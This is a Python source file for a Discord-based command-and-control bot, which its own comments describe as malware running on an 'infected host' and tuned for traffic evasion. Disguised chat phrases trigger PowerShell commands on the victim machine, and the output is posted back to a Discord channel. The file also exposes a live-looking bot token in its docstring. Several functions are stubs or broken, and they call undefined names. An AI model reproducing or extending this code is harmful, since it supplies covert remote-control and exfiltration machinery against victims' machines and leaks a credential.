

"""
This program will act as a Discord bot to read and write information to the discord channel on the infected host.
Client ID: 497092391811940362
Bot name: NN-C2-EVASION
Bot token: NDk3MDkyMzkxODExOTQwMzYy.DpaJOw.ZTOGEIVJfuYPKs4cp3lk71L0T_c
Permissions integer: 8
"""

import asyncio
import aiohttp
import json, time
from discord import Game
import discord
from discord.ext.commands import Bot
#from pupylib.PupyModule import config, PupyArgumentParser, PupyModule
import random, subprocess
from NetworkFlow import NetworkFlow

BOT_PREFIX = ("?", "!")


TOKEN = "" # Get at discordapp.com/developers/applications/me

with open("tokenfile", "r") as f:
    TOKEN = f.readline().strip("\n")
    print(TOKEN)


class MalwareReceiver:

    def __init__(self):

        self.instructor_available = False
        self.active = False
        self.instruction_set = None
        self.is_blocked = False
        self.instructionSetAliases = {
            "oy mate" : "pingback",
            "pls respond" : "pingback",
            "you wanna go mate?" : "pingback",
            "good to hear from you!" : "pingback",
            "hi there! :)" : "pingback"
        }
        self.instructionSetPupy = {"pingback" : "pwd"}

        self.perturbationParams = {
            "MaxPacketSizeBytes" : 100,
            "TimeDeltaMs" : 1000,
            "TimeNetworkFlowMs" : 1000
        }

        self.NetworkFlow = None

        self.client = Bot(command_prefix=BOT_PREFIX)
        self.setup()


    def setup(self):

        @self.client.event
        @asyncio.coroutine
        async def on_ready():
            print('Logged in as')
            print(self.client.user.name + "\n" + self.client.user.id + "\n--------")
            print(random.sample(list(self.instructionSetAliases.keys()), 2))

        @self.client.event
        @asyncio.coroutine
        async def on_message(message):
            channel = message.channel
            if message.content[1:] in self.instructionSetAliases:
                proc = subprocess.Popen(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe", ";", "&pwd"], stdout=subprocess.PIPE)
                output = proc.stdout.read()
                #print(str(output.ljust(100, u'A')))
                await self.client.send_message(channel, output)

        self.run()

        #@self.client.event
        #@asyncio.coroutine
        #async def delayed_padded_message(channel, message):





    def run(self):
        self.NetworkFlow = NetworkFlow()
        self.client.run(TOKEN)


    async def check_instructor_availability(self):
        """
        Sends a message to the discord channel. Based on the response, evaluate whether the instructor is available.
        """
        print(self.instructor_available)

    async def heartbeat(self):
        """
        Sends a heartbeat message to the subject channel by picking two random pingback values
        """

        print(self.active)

    async def check_if_new_messages(self):
        return len(self.client.messages) > 0


    """
    These below two methods could possibly exist in a feedback loop.
    """
    async def await_instruction_set(self):
        """
        Let the instructor know that the malware is awaiting further instructions.
        """
        active = True
        while active:
            time.sleep(0.5)
            while len(self.client.messages) != 0:
                message = self.client.messages.pop()
                if message in self.instructionSetAliases:
                    execute_instruction_set(self.instructionSetAliases[message])

            self.check_if_blocked()
        print("Waiting for instructions ...")

    async def execute_instruction_set(self, instruction):
        """
        Executes the instructions received and generates report and feedback for the control server.
        Must enable the pupy client prior to running the "remote" command.
        """
        if instruction == "pwd":
            instructionObj = pwd(None)
            output = instructionObj.run()
            if output != None:
                self.check_if_blocked()
                self.generate_report("pwd")
            self.check_if_blocked()
        print()

    async def check_if_blocked(self):
        print()

    @asyncio.coroutine
    async def list_servers():
        await client.wait_until_ready()
        while not client.is_closed:
            print("Current servers:")
            for server in client.servers:
                print(server.name)
            await asyncio.sleep(600)

testclient = MalwareReceiver()
